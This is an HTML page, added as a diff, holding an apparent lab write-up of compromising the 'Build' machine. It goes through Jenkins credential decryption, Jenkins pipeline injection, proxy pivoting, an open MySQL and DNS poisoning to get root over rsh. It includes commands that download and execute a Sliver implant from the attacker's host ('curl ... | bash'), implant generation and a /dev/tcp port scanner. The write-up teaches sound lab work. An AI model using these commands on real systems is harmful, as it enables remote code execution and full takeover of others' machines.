@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Write-Ups</title>
+    <link rel="stylesheet" href="style.css">
+    <script defer src="script.js"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <nav class="navbar">
+            <ul class="nav-links">
+                <li><a href="index.html"><i class="fas fa-home"></i> Home</a></li>
+                <li><a href="Write-up.html"><i class="fas fa-file-alt"></i> Write-Ups</a></li>
+                <li><a href="#redteam"><i class="fas fa-user-secret"></i> Red Team</a></li>
+            </ul>
+        </nav>
+        <div class="contents">
+            <h1>Build Write-up</h1>
+            <div class="big-to-normal-image">
+                <img src="images/build.png" alt="Build">
+            </div>
+            <p>The initial foothold begins with enumerating the <code>Rsync</code> protocol and mounting its directories, revealing Jenkins configuration files. Within these configs, I decrypted stored hashes, which granted me access to the Gitea web interface (port 3000) as the user <code>buildadm</code>.</p>
+            <p>Inside buildadm’s repository, there was a Jenkins pipeline script configured to execute arbitrary commands. Leveraging this, I was able to inject a reverse shell, gaining initial access. However, I quickly realized that the shell was running inside a container as root.</p>
+            <p>Exploring the root directory within the container, I discovered a .rhosts file, which allows authentication without a password from specific domains. At this point, I performed a port scan on other hosts in the network and found an open MySQL service. By setting up a proxy for port forwarding, I accessed the <code>MySQL</code> database and found that authentication was not required.</p>
+            <p>Within the MySQL database, I located a table containing a list of domains and their corresponding IPs, along with user credentials. After cracking the hash, I used these credentials to authenticate into another host running a login panel on port 80.</p>
+            <p>Upon logging into the panel, I discovered it was a DNS server, allowing me to perform a DNS poisoning attack. By spoofing a domain that was configured to allow passwordless authentication, I successfully gained access as root—this time outside of the container, achieving full system compromise.</p>
+            <h2>Enumeration</h2>
+            <h3>Nmap Scan</h3>
+            <div class="snippet">
+                <pre class="code-block">
+PORT     STATE    SERVICE         VERSION
+22/tcp   open     ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 47:21:73:e2:6b:96:cd:f9:13:11:af:40:c8:4d:d6:7f (ECDSA)
+|_  256 2b:5e:ba:f3:72:d3:b3:09:df:25:41:29:09:f4:7b:f5 (ED25519)
+512/tcp  open     exec            netkit-rsh rexecd
+513/tcp  open     login?
+514/tcp  open     shell           Netkit rshd
+873/tcp  open     rsync           (protocol version 31)
+3000/tcp open     http            Golang net/http server
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Content-Type: text/html; charset=utf-8
+|     Set-Cookie: i_like_gitea=e0683135d76e34f7; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=zmSqxrnq3OH2G8ujiB2FbqGJK9U6MTczODI5NzA5ODg3MzMyNDkxMw; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Fri, 31 Jan 2025 04:18:18 GMT
+|     !DOCTYPE html>
+|     html lang="en-US" class="theme-auto">
+|     head>
+|     meta name="viewport" content="width=device-width, initial-scale=1">
+|     title>Gitea: Git with a cup of tea/title>
+|     link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2J1aWxkLnZsOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9idWlsZC52bDozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Allow: HEAD
+|     Allow: HEAD
+|     Allow: GET
+|     Cache-Control: max-age=0, private, must-revalidate, no-transform
+|     Set-Cookie: i_like_gitea=59f2e3e0df556e0a; Path=/; HttpOnly; SameSite=Lax
+|     Set-Cookie: _csrf=P5Ts5_CYx-lHupbjSi7w4j3zeGw6MTczODI5NzA5OTU5MjcyNDgxOA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Fri, 31 Jan 2025 04:18:19 GMT
+|_    Content-Length: 0
+|_http-title: Gitea: Git with a cup of tea
+8081/tcp filtered blackice-icecap
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 722.93 seconds
+                </pre>
+            </div>
+            <h3>Rsync</h3>
+            <p>Rsync is utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers. Checking to see if we can access any files anonymously which may contain credentials or any useful information.</p>
+            <p>We can run rsync command to view if we have read access.</p>
+            <div class="snippet">
+                <pre class="code-block">
+rsync -av --list-only rsync://10.10.119.237 
+                </pre>
+            </div>
+            <img src="images/Build-Rsync.png" alt="Build Rsync">
+            <p>We can see the file share name is called backups so lets view what is inside the file by.</p>
+            <div class="snippet">
+                <pre class="code-block">
+rsync -av --list-only rsync://10.10.119.237/backups
+                </pre>
+            </div>
+            <img src="images/Build-Rsync-File.png" alt="Build Rsync File">
+            <p>There is a jenkins file so lets download the file. I will make a directory called backups and download the file onto there.</p>
+            <div class="snippet">
+                <pre class="code-block">
+rsync -av rsync://10.10.119.237:873/backups backups
+                </pre>
+            </div>
+            <img src="images/Build-Rsync-Mount.png" alt="Build Rsync Mount">
+            <p>Now once it is downloaded lets extract the information.</p>
+            <div class="snippet">
+                <pre class="code-block">
+tar -xvf jenkins.tar.gz
+                </pre>
+            </div>
+            <p>I was able to find a password hash for the user buildadm in this directory: <code>jenkins_configuration/jobs/build/config.xml</code>.</p>
+            <img src="images/Build-Jenkins-Hash.png" alt="Build Jenkins Hash">
+            <p>We can decrypt the password with this jenkins decrypt github I found <a href="https://github.com/hoto/jenkins-credentials-decryptor">https://github.com/hoto/jenkins-credentials-decryptor</a></p>
+            <div class="snippet">
+                <pre class="code-block">
+./jenkins-credentials-decryptor -m /home/pixelrazer/vulnlab/backups/jenkins_configuration/secrets/master.key -s /home/pixelrazer/vulnlab/backups/jenkins_configuration/secrets/hudson.util.Secret -c /home/pixelrazer/vulnlab/backups/jenkins_configuration/jobs/build/config.xml
+                </pre>
+            </div>
+            <h2>User as Root</h2>
+            <p>Viewing the web page on port 3000 we can see it is a gitea web page. Viewing into Explore we can see there is a repository by buildadm named dev.</p>
+            <img src="images/Build-gitea.png" alt="Build Gitea">
+            <p>Viewing the repository shows there is a jenkins file that runs a code.</p>
+            <img src="images/Build-Jenkins-pipe.png" alt="Build Jenkins Pipe">
+            <p>It is a <code>Jenkins Declarative Pipeline</code> script which enables automotive tasks. Since we got the user credentials from decrypting the password from jenkins we can log in as buildadm in gitea and edit the jenkinsfile and add a reverse shell. We can view in the <code>jenkins_configuration/jobs/build/jobs/dev/branches/main/builds/1/log</code> it will show it ran the <code>sh /bin/true</code></p>
+            <p>I will use a c2 server to catch the shell. I will use sliver.</p>
+            <p>Once you set up sliver I will generate a mtls implant.</p>
+            <div class="snippet">
+                <pre class="code-block">
+generate --mtls 10.8.5.55:8888 --os linux --save pwn.elf
+                </pre>
+            </div>
+            <p>Once that is done we need to make a shell file since the payload is in <code>.elf</code> format it cant execute via memory which is where the shell.sh script will come into play. We will make the shell.sh download our payload and give it execution rights and execute it for us.</p>
+            <div class="snippet">
+                <pre class="code-block">
+#!/bin/bash
+
+curl http://10.8.5.55:8000/pwn -o /tmp/pwn.elf
+chmod +x /tmp/pwn.elf
+/tmp/pwn.elf
+                </pre>
+            </div>
+            <p>We will host a python web server where the payload is saved. Now on gitea we will change the code into this:</p>
+            <div class="snippet">
+                <pre class="code-block">
+curl -s http://10.8.5.55:8000/pwn.sh | bash
+                </pre>
+            </div>
+            <img src="images/Build-Jenkins-Reverse-Shell.png" alt="Build Jenkins Reverse Shell">
+            <p>It will execute the payload in memory and catch a reverse shell.</p>
+            <img src="images/Build-C2.png" alt="Build C2">
+            <h2>Privilege Escalation</h2>
+            <p>We are root in the box however it is a container which we need to escape.</p>
+            <p>Since IP commands are restricted, we cannot directly check network interfaces using tools like <code>ip a</code>. However, we can use the <code>hostname -I</code> command, which reveals our IP address as <code>172.18.0.3</code>. Inside the <code>/root</code> directory, we find a <code>.rhosts</code> file. This file is traditionally used by r-commands (rlogin, rsh, and rcp) to enable passwordless authentication for specified remote hosts and users. Although modern systems rely on SSH for secure remote access, <code>.rhosts</code> files can still be found in certain legacy environments, potentially allowing authentication bypass if misconfigured.</p>
+            <img src="images/Build-Rhosts.png" alt="Build Rhosts">
+            <p>Within sliver we can run netstat.</p>
+            <img src="images/Build-Netstat.png" alt="Build Netstat">
+            <p>This shows us there is local port forwarding going on. Within sliver we can run proxy5 that is built in so it will be easy for us to reach to the other hosts.</p>
+            <div class="snippet">
+                <pre class="code-block">
+socks5 start
+                </pre>
+            </div>
+            <img src="images/Build-Proxy.png" alt="Build Proxy">
+            <p>Now make sure to add the correct information to your <code>proxychains.config</code> which is in <code>/etc/proxychains.config</code>.</p>
+            <p>However doing a port scan with proxy will take a very long time. There is another way to check if there is a port open. Using this script we can check to see if there is any ports open I will start with <code>172.18.0.1</code> and work my way up If I find nothing.</p>
+            <div class="snippet">
+                <pre class="code-block">
+#!/bin/bash
+
+trap "echo 'Stopping scan...'; exit" SIGINT
+for i in {1..9000} ; do
+  SERVER="IP"
+  PORT=$i
+  (echo  > /dev/tcp/$SERVER/$PORT) >& /dev/null &&
+   echo "Port $PORT seems to be open"
+done
+                </pre>
+            </div>
+            <img src="images/Build-Port-Scan.png" alt="Build Port Scan">
+            <p>There is port 3306 which is mysql and an interesting new port 8081. Lets check out mysql since we already set up our socks5 we can connect to mysql.</p>
+            <div class="snippet">
+                <pre class="code-block">
+proxychains mysql -h 172.18.0.1 -u root --skip-ssl
+                </pre>
+            </div>
+            <p>And we are in without a password!.</p>
+            <img src="images/Build-Mysql.png" alt="Build Mysql">
+            <p>There is an interesting database called powerdnsadmin.</p>
+            <div class="big-to-normal-image">
+                <img src="images/Build-Mysql-Databases.png" alt="Build Mysql Databases">
+            </div>
+            <p>Inside of powerdnsadmin there is a table called <code>user</code> which tend to have hashes for the users.</p>
+            <div class="snippet">
+                <pre class="code-block">
+use powerdnsadmin;
+
+show tables;
+                </pre>
+            </div>
+            <div class="big-to-normal-image">
+                <img src="images/Build-Mysql-Tables.png" alt="Build Mysql Tables">
+            </div>
+            <p>we can view the user table with this command:</p>
+            <div class="snippet">
+                <pre class="code-block">
+select * from user;
+                </pre>
+            </div>
+            <p>We see a admin hash and we can send that to hashcat which it cracks the hash. There is also a <code>records</code> table which has all the ip and domains for dns.</p>
+            <img src="images/Build-Mysql-Records.png" alt="Build Mysql Records Table">
+            <p>Now lets go back to our machine and run a port scan on all the ip addresses we found in our mysql search.</p>
+            <p>Ip of <code>172.18.0.6</code> has port 80 open which shows us a gui login screen and we were able to login as admin from the credentials found in mysql.</p>
+            <div class="big-to-normal-image">
+                <img src="images/Build-Login-Panel.png" alt="Build Login Panel">
+            </div>
+            <img src="images/Build-DNS-Portal.png" alt="Build Dns Portal">
+            <p>This is a DNS control where we can control DNS. Since we can control DNS we can perform DNS poisoning attack which we will add our ip as one of the domains found in the <code>.rhosts</code> file which will allow us to log into the machine without a password as I explained before. We will add the <code>admin</code> domain and our IP since there is already the intern domain being used.</p>
+            <img src="images/Build-DNS-Poisoning.png" alt="Build DNS Poisoning">
+            <p>Now save the changes and we can use this command to log into the machine as root without a password.</p>
+            <div class="snippet">
+                <pre class="code-block">
+rsh root@10.10.102.65
+                </pre>
+            </div>
+            <div class="big-to-normal-image">
+                <img src="images/Build-Root-pwn.png" alt="Build Root Pwn">
+            </div>
+            <h2>Conclusion</h2>
+            <p>This box demonstrated a complex yet realistic attack chain, combining multiple misconfigurations and insecure practices across different services.</p>
+            <p>The exploitation began with Rsync enumeration, allowing access to Jenkins configuration files. By decrypting stored credentials, I gained access to Gitea, where a Jenkins pipeline script enabled remote command execution, leading to a containerized root shell.</p>
+            <p>Within the container, the presence of a .rhosts file hinted at a legacy authentication mechanism, which proved crucial later. By leveraging network pivoting through proxychains and SOCKS5, I identified an unsecured MySQL database. This provided domain mappings and hashed credentials, which, once cracked, granted access to a DNS control panel.</p>
+            <p>By exploiting DNS poisoning, I was able to impersonate a trusted domain, taking advantage of the rsh authentication mechanism to escalate privileges and gain root access on the main host system.</p>
+        </div>
+    </div>
